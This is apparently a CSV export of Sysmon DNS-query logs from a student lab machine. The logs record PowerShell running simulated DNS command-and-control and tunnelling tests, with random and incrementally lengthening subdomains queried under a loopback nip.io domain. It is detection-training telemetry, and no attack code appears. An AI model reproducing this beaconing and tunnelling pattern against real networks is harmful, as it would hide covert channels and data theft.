"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174839,"Query: atomicredteam-654224.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.011","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174840,"Query: atomicredteam-78779.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.050","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174841,"Query: atomicredteam-688859.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.090","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174842,"Query: atomicredteam-24805.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.131","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174843,"Query: atomicredteam-320293.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.171","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174844,"Query: atomicredteam-109810.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.223","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174845,"Query: atomicredteam-329113.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.262","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174846,"Query: atomicredteam-589670.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.301","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174847,"Query: atomicredteam-400610.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.339","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174848,"Query: atomicredteam-236799.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:48.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174850,"Query: atomicredteam-757632.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:46.415","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:52.781 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174852,"Query: atomicredteam.714287.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:50.803","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:22.841 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174853,"Query: atomicredteam.549074.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:28:20.867","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:52.896 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174855,"Query: atomicredteam.611427.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:28:51.207","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:58.748 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174858,"Query: DESKTOP-G2OBL3D ¦ Result: - ¦ Proc: C:\Windows\System32\svchost.exe ¦ PID: 1764 ¦ PGUID: E9F06A57-5FE3-694E-2100-000000002400","QueryStatus: 1460 ¦ User: NT AUTHORITY\NETWORK SERVICE ¦ UtcTime: 2025-12-26 10:28:57.962","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:04.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174859,"Query: DESKTOP-G2OBL3D ¦ Result: fe80::687:f268:91ac:9155;fe80::d848:34b7:cdfe:fb1;::ffff:192.168.1.10;::ffff:192.168.201.128; ¦ Proc: C:\Windows\System32\wbem\WmiPrvSE.exe ¦ PID: 3740 ¦ PGUID: E9F06A57-5FE8-694E-4600-000000002400","QueryStatus: 0 ¦ RuleName: - ¦ User: NT AUTHORITY\NETWORK SERVICE ¦ UtcTime: 2025-12-26 10:29:03.510","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:23.239 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175200,"Query: atomicredteam.758378.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:21.258","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:43.289 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175214,"Query: westus2-0.in.applicationinsights.azure.com ¦ Result: type: 5 westus2-0.in.ai.monitor.azure.com;type: 5 westus2-0.in.ai.privatelink.monitor.azure.com;type: 5 gig-ai-prod-westus2-0.trafficmanager.net;::ffff:20.9.155.150; ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2512 ¦ PGUID: E9F06A57-6241-694E-E901-000000002400","QueryStatus: 0 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:42.372","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175220,"Query: 028.a.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.341","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175221,"Query: 029.at.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.512","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175222,"Query: 030.ato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.551","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175223,"Query: 031.atom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175224,"Query: 032.atomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175225,"Query: 033.atomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:51.940","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175226,"Query: 034.atomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.108","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175227,"Query: 035.atomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.148","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175228,"Query: 036.atomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.185","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175229,"Query: 037.atomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.225","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175230,"Query: 038.atomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175231,"Query: 039.atomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175232,"Query: 040.atomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.338","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175233,"Query: 041.atomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.376","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175234,"Query: 042.atomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.414","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175235,"Query: 043.atomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.452","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175236,"Query: 044.atomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.496","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175237,"Query: 045.atomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175238,"Query: 046.atomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.579","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175239,"Query: 047.atomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.616","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:52.892 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175240,"Query: 048.atomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.655","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175241,"Query: 049.atomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175242,"Query: 050.atomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:52.995","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175243,"Query: 051.atomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.036","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175244,"Query: 052.atomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.075","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175245,"Query: 053.atomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.113","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175246,"Query: 054.atomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175247,"Query: 055.atomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.190","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175248,"Query: 056.atomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.227","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
